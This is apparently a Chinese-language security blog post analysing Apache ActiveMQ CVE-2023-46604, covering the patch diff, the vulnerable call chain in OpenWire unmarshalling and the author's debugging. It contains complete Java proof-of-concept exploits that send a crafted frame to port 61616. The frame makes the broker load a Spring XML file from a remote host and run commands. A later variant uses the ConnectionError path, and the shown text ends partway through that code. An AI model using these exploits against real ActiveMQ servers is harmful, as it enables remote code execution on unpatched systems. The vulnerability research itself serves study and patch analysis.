<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="stoocea">



    <meta name="description" content="time thicking away">



<title>ActiveMQ CVE-2023-46604漏洞分析 | stoocea&#39;s blog</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 6.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">stoocea&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">stoocea&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">ActiveMQ CVE-2023-46604漏洞分析</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">stoocea</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">十月 22, 2024&nbsp;&nbsp;18:00:00</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/CVEs/">CVEs</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <p>炒个冷饭，最近实习在忙工作上的事情，加之最近没什么感兴趣的洞，复现学习一下之前的一些经典的漏洞,没想到很凑巧的是这个洞的第一线就是公司的师傅，复现的过程中和师傅们交流的时候接触到的是完全不一样的一种思路，但话又说会了，这不就是这个洞最原来的样子吗？至少我最后回过来看网上其他师傅们的文章，感觉就是大部分都干了，除了一两个大师傅的思路，又快又准，并且光从思路就能读出基础雄厚，条条大路通罗马。</p>
<p>话有点多了，本身这个洞师傅们都看的差不多了，后面正文的部分我就多写了一点了我的心路历程和踩过的坑。</p>
<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><blockquote>
<p>ActiveMQ默认开放了61616端口用于接收OpenWire协议消息，由于针对异常消息的处理存在反射调用逻辑，攻击者可能通过构造恶意的序列化消息数据加载恶意类，执行任意代码。</p>
</blockquote>
<p>参考：<a target="_blank" rel="noopener" href="https://www.oscs1024.com/hd/MPS-bd9c-7xsh">https://www.oscs1024.com/hd/MPS-bd9c-7xsh</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f">https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f</a></p>
<p>相关版本信息</p>
<blockquote>
<p>本体：</p>
<p>[5.18.0, 5.18.3) (-∞, 5.15.16) [5.17.0, 5.17.6) [5.16.0, 5.16.7)</p>
<p>Maven依赖 activemq-client</p>
<p>[5.17.0, 5.17.6) [5.16.0, 5.16.7) (-∞, 5.15.16) [5.18.0, 5.18.3)</p>
<p>‍</p>
</blockquote>
<p>获取到了两段信息，一是好像不是反序列化的洞，是类加载了触发的静态代码块？还是实例化出来类的构造方法被执行了？之后sink具体分析再看。二是相关功能标识为OpenWire。</p>
<h1 id="sink点和源码diff分析"><a href="#sink点和源码diff分析" class="headerlink" title="sink点和源码diff分析"></a>sink点和源码diff分析</h1><h2 id="patch-diff分析"><a href="#patch-diff分析" class="headerlink" title="patch diff分析"></a>patch diff分析</h2><p>给出的commit中有两个包，一是activeMQ-client，二是activemq-openwire-legacy。改的其实都是一个类–<code>BaseDataStreamMarshaller</code>​，但是改的内容不是往他的里面加校验逻辑，而是重新创建了一个类OpenWireUtil，用来检验Class.forName出的类的类型是否为ThrowAble类型，如果不是就抛出异常，具体内容如下：</p>
<p><img src="/images/activeMQ/assets/image-20241017141140-0jky052.png" alt="image">​</p>
<p>然后就是把这个Util类import进每一个BaseDataStreamMarshaller，这里的BaseDataStreamMarshaller为什么这么多呢？其实就是OpenWire这个传输协议有不同个版本，导致每一个版本都需要特别写一段MarShall反序列化的类，用来处理传输中的反序列化数据。有这些：</p>
<p><img src="/images/activeMQ/assets/image-20241017115255-iiay6iy.png" alt="image">​</p>
<h2 id="sink点分析"><a href="#sink点分析" class="headerlink" title="sink点分析"></a>sink点分析</h2><p>然而他每一个Marshaller都改了，说明每一个都能触发，随便找一个Marshaller具体跟进一下：</p>
<p><img src="/images/activeMQ/assets/image-20241017141444-g83cjpf.png" alt="image">​</p>
<p><img src="/images/activeMQ/assets/image-20241017135410-5gxkmuz.png" alt="image">​</p>
<p>很好，那触发点应该是在createThrowable方法了，但是forName去全类名初始化类，然后实例化，实例化的参数是message。</p>
<p>心中确定三个目的就是，className和message以及createThrowable方法是否可控。message最终会做className指定类的构造方法的参数传入并执行相应的逻辑。并且我们可以看到message和className两者都是String类型，已经给我们标出了最终sink的模样：一个类的构造方法+参数为一个字符串，触发RCE或者代码执行。起初我想到了ScriptEnginer，但是他参数得是ClassLoader类型，就卡了我很久。只能说确实经验少了，ActiveMQ下自带Springboot的依赖，<code>ClassPathXmlApplicationContext</code>​肯定是可以用到的。现在最终的sink点找到了，往上寻找一下该如何调用进来。</p>
<h1 id="source寻找和调用流分析"><a href="#source寻找和调用流分析" class="headerlink" title="source寻找和调用流分析"></a>source寻找和调用流分析</h1><h2 id="0x01-初步分析整体调用逻辑以及构造初步poc"><a href="#0x01-初步分析整体调用逻辑以及构造初步poc" class="headerlink" title="0x01 初步分析整体调用逻辑以及构造初步poc"></a>0x01 初步分析整体调用逻辑以及构造初步poc</h2><p>往上寻找一下createThrowable方法被哪里调用了。两处地方，一处是<code>tightUnmarshalThrowable</code>​，还有一个<code>looseUnmarsalThrowable</code>​，其实两个都能触发</p>
<p><img src="/images/activeMQ/assets/image-20241018170449-zy8tgtw.png" alt="image">​</p>
<p>处理逻辑唯一的不同在于tight（严谨的反序列化）在获取clazz和message的时候会多加一个参数–booleanStream，这个是用来检测我们传输过来的数据是UTF-8的形式还是ASCII的形式。说是双重的原因其实也就是tight比loose（松弛的反序列化）多加了一层if判断boolean。所以这里其实还是有一层限制的，就是activeMQ上可能是tight的反序列化模式，导致我们要多写几次boolean，不过我默认启动activeMQ就是loose松弛模式的反序列化，之后写EXP会提到这个问题。</p>
<p><img src="/images/activeMQ/assets/image-20241018170849-3r1vfzx.png" alt="image">​</p>
<p>再网上寻找调用，其实两个反序列化都是一样的调用，这里我就拿looseUnmarshall来举例了。师傅们在网上应该也是最熟悉这个了。这里有三层调用，按道理来说，三者都能够调用到并且最终sink，但是具体的问题在于MessageAckMarshaller会有写入dataOut的操作，这个dataout还与我们的写入（具体到我们的payload）流进行了绑定，我没有具体跟进，但是我觉得为了避免具体的麻烦，还是找ExceptionReponse或者ConnectionError。</p>
<p><img src="/images/activeMQ/assets/image-20241018172224-wb3zato.png" alt="image">​</p>
<p>先试试ExceptionResponseMarshaller，之后打POC的再测试ConnectionError</p>
<p>跟进ExceptionResponseMarshaller的<code>looseUnmarsalThrowable</code>​方法调用，传入的参数是wireFormat以及dataIn，这一层了解参数即可</p>
<p><img src="/images/activeMQ/assets/image-20241018182852-fg0wig7.png" alt="image">​</p>
<p>继续往上调用，这里的UnmarshaNestedObject其实在分析MessageAckMarshaller为什么不行的时候遇到过。但实际上这里的looseUnmarshalNestedObject是OpenWireFormat的一个工具类，他并不会直接参与61616端口的通信数据处理的过程。这里doUnmarshal是会的。</p>
<p><img src="/images/activeMQ/assets/image-20241018183001-vop6d71.png" alt="image">​</p>
<p>再往上寻找，是来到了OpenWireFormat的unmarshal方法，只不过有两种不同的传参，有一个是byteSequence的参数，最终还是要封装成DataInput传入doUnmarshal，并且参与的是正常数据的反序列化流程，doUnmarshal更像是一个处理所有传输数据类型的分流口。</p>
<p>我们跟进doUnmarshal的具体内容：</p>
<p>这里存在一处读数据的操作，也就是第一行DataInput流，调用readByte方法读取内容，这个读出来的数据被赋值为了dataType变量。接着往下这里就进行了判断，判断它是否为NULL_TYPE类型，这里的NULL_TYPE在内存中默认为0</p>
<p><img src="/images/activeMQ/assets/image-20241022162153-iakuaka.png" alt="image">​</p>
<p>只要不为0就开始找DataStreamMarshaller，怎么找，以及怎么找到我们想要的ExceptionRepsonseMarshaller或者ConnectionErrorMarshaller？其实就是根据dataType的值来的，在dataMarshllers内存中，分别对应16和31，所以可想而知，这里的值可以为16或者31，为了流畅性，我们先选择31的ExceptionRepsonseMarshaller。之后就是判断tightEncodingEnabled变量，我的activeMQ默认出来是false，也就是默认采用looseUnmarshal，之前也提到了这个问题，后续解答。</p>
<p><img src="/images/activeMQ/assets/image-20241022163239-roc2opu.png" alt="image">​</p>
<p>再往上调用，有两个地方都调用到了doUnmarshal，其实就是都是unMarshal方法，只是两者的接收参数不同，一个是byteSequence，一个是dataInput，我们如果构造poc发字节的话，其实dataInput更方便，byteSequence的调用还有一些方法会对字节进行操作，不太好构造。所以进入DataInput参数的unmarshal分析，在unmarshal中，也会有读取字节的操作–readInt，看上去是读取整个数据流字节的长度，但是只要这个值不是默认为空（为空会直接置为最大值），就不会进入下一个if判断超出接收的最大字节抛出错误。所以可知这里也要写一个数，有就行。</p>
<p><img src="/images/activeMQ/assets/image-20241022163831-qdvn9yz.png" alt="image">​</p>
<p>再后续就是TcpTransport中的一些操作了。</p>
<p><img src="/images/activeMQ/assets/image-20241018184756-hpvnrdq.png" alt="image">​</p>
<p>过程其实了解就好，其实可以读出来这个处理61616端口接收到的Tcp信息的逻辑是在干什么，一般通过这个方式进行的数据传输都是反序列化传输的，有没有洞就还是得自己去看和构造，挖这个洞的师傅明显是感受到了，并且对过程很了解。</p>
<p>现在分析过来其实主要集中于两个问题：1.我们如何向61616端口发送openwire协议信息及payload？2.如何控制payload的内容？</p>
<p>简要回答一下这两个问题：61616虽然明面上叫做openwire协议，实际上就是支持TCP协议进行传输。所以我们只需要在对应的语言中选择能够建立TCP链接，以及能够控制TCP传输内容的对应代码即可。然后直接上代码。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.activemq.transport.tcp.TcpTransport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestActiveMQ2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//首先建立一个socket用以TCP通信，然后我们是通过socket将数据</span></span><br><span class="line">        Socket socket=<span class="keyword">new</span> <span class="title class_">Socket</span>(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">61616</span>);</span><br><span class="line">        OutputStream SocketoutputStream=socket.getOutputStream();</span><br><span class="line">        DataOutputStream outputStream=<span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(SocketoutputStream);</span><br><span class="line">        <span class="comment">//第一段对应OpenWireFormat#unmarshal中对于size的获取int size = dis.readInt(); 这一段会用来判断是否超过单次TCP传输协议的最大值，如果我们不填就会查出最大值</span></span><br><span class="line">        outputStream.writeInt(<span class="number">6</span>);</span><br><span class="line">        <span class="comment">//这里对应OpenWireFormat#doUnmarshal方法，读取下一个字段，用来判断该以何种形式处理接下来的具体数据层，31对应的是ExceptionResponse反序列化类，也就是说我们接下来的具体数据层是在反序列化一个报错类。</span></span><br><span class="line">        <span class="comment">//不过这个反序列化不是标准的反序列化，而是通过全类名forName进行加载之后，再通过实例化构造出。</span></span><br><span class="line">        outputStream.writeBytes(<span class="string">&quot;31&quot;</span>);</span><br><span class="line">        <span class="comment">//为了默认松弛loose反序列化，第一段writeBoolean其实是为了能够进去第一个大if判断，这个必须要，不然无法调用到具体逻辑。</span></span><br><span class="line">        outputStream.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//第三个writeBoolean是为了clazz能够读取到，也就是我们想要初始化的那个类的全类名，读的时候是readUTF，所以写的时候也是readUTF。这里存在一个问题，我具体会在代码块之后讲解。</span></span><br><span class="line">        outputStream.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">        outputStream.writeUTF(<span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>);</span><br><span class="line">        <span class="comment">//道理相同，写message</span></span><br><span class="line">        outputStream.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">        outputStream.writeUTF(<span class="string">&quot;http://127.0.0.1:7567/poc.xml&quot;</span>);</span><br><span class="line">        outputStream.flush();</span><br><span class="line">        outputStream.close();</span><br><span class="line">        SocketoutputStream.flush();</span><br><span class="line">        SocketoutputStream.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="0x02-完整流程细节和最终poc"><a href="#0x02-完整流程细节和最终poc" class="headerlink" title="0x02 完整流程细节和最终poc"></a>0x02 完整流程细节和最终poc</h2><p>这么看好像没什么不对，完全符合我上面分析到的逻辑和调用栈，但事实是，当我调试到BaseDataStreamMarshaller#looseUnmarshalString，这里是开始读取Clazz字符串了，跟进到具体代码，readUTF报错了，为EOFExcetion。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> String <span class="title function_">looseUnmarshalString</span><span class="params">(DataInput dataIn)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (dataIn.readBoolean()) &#123;</span><br><span class="line">            <span class="keyword">return</span> dataIn.readUTF();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我一开始并不清楚为什么，开始一直往里面调试，就单独在调试d<code>ataIn.readUTF();</code>​这一块，读取到第19个字节的时候就抛出EOF了，说明内容还是读取了，但是没有读到指定的内容，并且只读了19个字节。唯一的可能就是source分析的时候漏了一些读取的操作，导致POC没对。继续调试找问题</p>
<p>直到doUnmarshal都是没有问题的，我按照写的poc进行传输，进入doMarshal读取dataType是31，以这里为开始点，往下看，来到ExceptionResponseMarsheller的looseUnmarshal，很明显他这里的调用父类的looseUnmarshal中，还进行了两次次readInt和readBoolean：</p>
<p><img src="/images/activeMQ/assets/image-20241022164630-vojli1w.png" alt="image">​</p>
<p><img src="/images/activeMQ/assets/image-20241022165254-6c8thn8.png" alt="image">​</p>
<p><img src="/images/activeMQ/assets/image-20241022165313-1y338ef.png" alt="image">​</p>
<p>所以我们还要补充两次次writeInt和writeBoolean，按调用顺序来，改完之后的poc为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestActiveMQ2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//首先建立一个socket用以TCP通信，然后我们是通过socket将数据</span></span><br><span class="line">            <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">61616</span>);</span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">SocketoutputStream</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">            <span class="type">DataOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(SocketoutputStream);</span><br><span class="line">            <span class="type">DataOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(SocketoutputStream);</span><br><span class="line">            <span class="comment">//第一段对应OpenWireFormat#unmarshal中对于size的获取int size = dis.readInt(); 这一段会用来判断是否超过单次TCP传输协议的最大值，如果我们不填就会查出最大值</span></span><br><span class="line">            outputStream.writeInt(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//这里对应OpenWireFormat#doUnmarshal方法，读取下一个字段，用来判断该以何种形式处理接下来的具体数据层，31对应的是ExceptionResponse反序列化类，也就是说我们接下来的具体数据层是在反序列化一个报错类。</span></span><br><span class="line">            <span class="comment">//不过这个反序列化不是标准的反序列化，而是通过全类名forName进行加载之后，再通过实例化构造出。</span></span><br><span class="line">            outputStream.writeByte(<span class="number">31</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//ExceptionResponseMarshaller在调用looseUnmarshal的时候会调用到父类的两次writeInt和writeBoolean</span></span><br><span class="line">            outputStream.writeInt(<span class="number">1</span>);</span><br><span class="line">            outputStream.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">            outputStream.writeInt(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//为了默认松弛loose反序列化，第一段writeBoolean其实是为了能够进去第一个大if判断，这个必须要，不然无法调用到具体逻辑。</span></span><br><span class="line">            outputStream.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//outputStream.writeInt(1);</span></span><br><span class="line">            <span class="comment">//第三个writeBoolean是为了clazz能够读取到，也就是我们想要初始化的那个类的全类名，读的时候是readUTF，所以写的时候也是readUTF。这里存在一个问题，我具体会在代码块之后讲解。</span></span><br><span class="line">            outputStream.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">            outputStream.writeUTF(<span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>);</span><br><span class="line">            <span class="comment">//道理相同，写message</span></span><br><span class="line">            outputStream.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">            outputStream.writeUTF(<span class="string">&quot;http://192.168.86.135:6171/poc.xml&quot;</span>);</span><br><span class="line">            outputStream.flush();</span><br><span class="line">            outputStream.close();</span><br><span class="line">            SocketoutputStream.flush();</span><br><span class="line">            SocketoutputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>再尝试打入：</p>
<p><img src="/images/activeMQ/assets/image-20241022165815-4nu1jhh.png" alt="image">​</p>
<p><img src="/images/activeMQ/assets/image-20241022165851-a7qllkj.png" alt="image">​</p>
<p>我这里的poc.xml构造的命令是touch &#x2F;tmp&#x2F;stoocea,进容器看一眼：</p>
<p><img src="/images/activeMQ/assets/image-20241022170256-4l12hdj.png" alt="image">​</p>
<p>‍</p>
<h1 id="patch随想"><a href="#patch随想" class="headerlink" title="patch随想"></a>patch随想</h1><p>一开始就看了这个patch，一路分析下来感觉这个patch还是patch得挺好的，至少我看到得几个思路都被拦了，也就是没有绕过的。（水平太低了是这样的），他是在最终sink点patch的，我见过之前的某些系统的patch，比如24年今年8月份的ofbiz，他也是patch的sink的两个groovy脚本。为什么这个这么有效？而ofbiz的就能够随便绕过？ofbiz的几个groovysink都是具体到某一个利用，只要绕过鉴权就能够到处用，patch这几个利用肯定会有漏网之鱼，这就跟写黑名单一样。当时我也想顺着Y4师傅这个鉴权绕过挖几个CVE，但是奈何当时去打比赛打完萎靡不正，被其他人挖了，apache官方才patch了鉴权（是patch了鉴权吗，我忘得差不多了，至少那几个sink又被patch了）。后续这个利用思路就没声音了。</p>
<p>而activeMQ这个真正的利用点只有这一个反序列化，他前面没有涉及到通用的鉴权绕过或者其他通用绕过调用到API的思路，直接就是一条笔直的路，所以它拦在sink就能把攻击堵死。</p>
<h1 id="一些问题的解决"><a href="#一些问题的解决" class="headerlink" title="一些问题的解决"></a>一些问题的解决</h1><h2 id="tight-or-loose？"><a href="#tight-or-loose？" class="headerlink" title="tight or loose？"></a>tight or loose？</h2><p>写这个文章就为了这最后几点，弄清楚一些问题而已.</p>
<p>一个一个来，首先是tight和loose两者Unmarshal反序列化到底有没有区别。这个问题其实看代码能明白，就看<code>tightUnmarsalThrowable</code>​方法即可（tightUnmarshal本身也是调用了父类的<code>tightUnmarshal</code>​方法，但和loose读的东西都是两个Int和一个boolean，没区别）<code>tightUnmarshal</code>​这里没区别，跟进<code>tightUnmarshalString</code>​</p>
<p><img src="/images/activeMQ/assets/image-20241022170643-eco5wn4.png" alt="image">​</p>
<p>这里就有区别了，看它注释的意思就是区别一下是以ASCII方法读取还是直接UTF-8的形式读取，那一层readBoolean过了，即使第二层if没过，也还是进行的dataIn.readUTF()。</p>
<p><img src="/images/activeMQ/assets/image-20241022170706-sxp3q1x.png" alt="image">​</p>
<p>而最后的<code>createThrowable</code>​是公共的。都是这个逻辑的sink。</p>
<p>所以结论就是：<strong>不论服务配置的是tight还是loose反序列化模式，都能拿这个poc直接打。</strong></p>
<p>‍</p>
<h2 id="ExceptionResponse-or-ConnectionError？"><a href="#ExceptionResponse-or-ConnectionError？" class="headerlink" title="ExceptionResponse or ConnectionError？"></a>ExceptionResponse or ConnectionError？</h2><p>不多说，直接打，31改成16就行，然后唯一需要注意的点ConnectionErrorMarshaller的looseUnmarshal也会调父类的<code>looseUnmarshal</code>​,不过它的父类之后就只会读取一次Int和Boolean，所以去掉一个Int就好</p>
<p><img src="/images/activeMQ/assets/image-20241022172024-nhospee.png" alt="image">​</p>
<p>POC如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestActiveMQ2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//首先建立一个socket用以TCP通信，然后我们是通过socket将数据</span></span><br><span class="line">            <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">61616</span>);</span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">SocketoutputStream</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">            <span class="type">DataOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(SocketoutputStream);</span><br><span class="line">            <span class="type">DataOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(SocketoutputStream);</span><br><span class="line">            <span class="comment">//第一段对应OpenWireFormat#unmarshal中对于size的获取int size = dis.readInt(); 这一段会用来判断是否超过单次TCP传输协议的最大值，如果我们不填就会查出最大值</span></span><br><span class="line">            outputStream.writeInt(<span class="number">6</span>);</span><br><span class="line"></span><br><span 